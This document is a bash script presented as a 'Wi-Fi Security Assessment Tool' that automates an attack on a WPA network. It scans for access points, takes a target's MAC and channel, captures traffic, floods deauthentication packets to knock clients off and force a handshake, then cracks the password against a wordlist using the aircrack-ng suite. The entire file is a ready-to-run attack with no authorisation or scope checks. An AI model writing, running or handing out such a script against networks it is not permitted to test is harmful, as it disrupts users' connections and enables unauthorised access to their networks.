#!/bin/bash

# Global Configuration
INTERFACE="wlan0"  # The network interface to be used
TIMESTAMP=$(date +%Y%m%d_%H%M%S)  # Timestamp for unique file names
CAPTURE_PREFIX="wpa_capture_$TIMESTAMP"  # Prefix for capture files
WORDLIST=""  # Path to the wordlist for password cracking
declare -gA TARGET=(["MAC"]="" ["CHANNEL"]="")  # Associative array for target AP details

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
NC='\033[0m'  # No color

# Cleanup and error handling
cleanup() {
    echo -e "\n${YELLOW}[*] Cleaning up...${NC}"
    kill_processes
    exit 0
}

# Function to kill background processes
kill_processes() {
    for pid in "${BACKGROUND_PIDS[@]}"; do
        kill -9 "$pid" 2>/dev/null
    done
    wait 2>/dev/null
}

# Trap signals for cleanup
trap cleanup INT TERM EXIT

# Check if the script is run as root
check_root() {
    if [ "$(id -u)" != "0" ]; then
        echo -e "${RED}[!] This script must be run as root${NC}"
        exit 1
    fi
}

# Check if required tools are installed
check_tools() {
    local required=("airodump-ng" "aireplay-ng" "aircrack-ng")
    for tool in "${required[@]}"; do
        if ! command -v "$tool" &>/dev/null; then
            echo -e "${RED}[!] Missing required tool: $tool${NC}"
            exit 1
        fi
    done
}

# Validate MAC address format
validate_mac() {
    [[ "$1" =~ ^([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2}$ ]] && return 0 || return 1
}

# Validate channel number
validate_channel() {
    [[ "$1" =~ ^[1-9][0-9]?$ ]] && return 0 || return 1
}

# Get target information from user
get_target_info() {
    while true; do
        read -p "Enter target AP MAC (00:11:22:33:44:55): " TARGET["MAC"]
        validate_mac "${TARGET[MAC]}" && break
        echo -e "${RED}[!] Invalid MAC address format${NC}"
    done

    while true; do
        read -p "Enter channel number: " TARGET["CHANNEL"]
        validate_channel "${TARGET[CHANNEL]}" && break
        echo -e "${RED}[!] Invalid channel number${NC}"
    done

    while true; do
        read -p "Enter path to wordlist: " WORDLIST
        [ -f "$WORDLIST" ] && break
        echo -e "${RED}[!] Wordlist file not found${NC}"
    done
}

# Scan networks
scan_networks() {
    echo -e "\n${YELLOW}[*] Starting network scan...${NC}"
    airodump-ng "$INTERFACE"
}

# Start capture process
start_capture() {
    echo -e "\n${YELLOW}[*] Starting handshake capture on channel ${TARGET[CHANNEL]}...${NC}"
    airodump-ng -c "${TARGET[CHANNEL]}" -d "${TARGET[MAC]}" -w "$CAPTURE_PREFIX" "$INTERFACE" &
    BACKGROUND_PIDS+=($!)
    sleep 5
}

# Perform deauthentication attack
deauth_attack() {
    echo -e "${YELLOW}[*] Sending deauthentication packets...${NC}"
    aireplay-ng -0 10 -a "${TARGET[MAC]}" "$INTERFACE"
}

# Monitor for handshake capture
monitor_handshake() {
    echo -e "${YELLOW}[*] Monitoring for handshake (Ctrl+C to abort)...${NC}"
    while true; do
        if aircrack-ng -q "${CAPTURE_PREFIX}-01.cap" 2>/dev/null | grep -q "WPA (1 handshake)"; then
            echo -e "${GREEN}[+] Handshake successfully captured!${NC}"
            return 0
        fi
        sleep 5
    done
}

# Crack the captured handshake
crack_password() {
    echo -e "\n${YELLOW}[*] Starting password cracking...${NC}"
    aircrack-ng -w "$WORDLIST" "${CAPTURE_PREFIX}-01.cap"
}

# Main function to orchestrate the script flow
main() {
    check_root
    check_tools

    echo -e "\n${GREEN}=== Wi-Fi Security Assessment Tool ===${NC}"
    
    scan_networks
    get_target_info
    start_capture
    deauth_attack
    monitor_handshake && crack_password

    echo -e "\n${GREEN}[+] Process completed!${NC}"
    echo -e "Capture files saved as: ${CAPTURE_PREFIX}-*.cap"
}
main
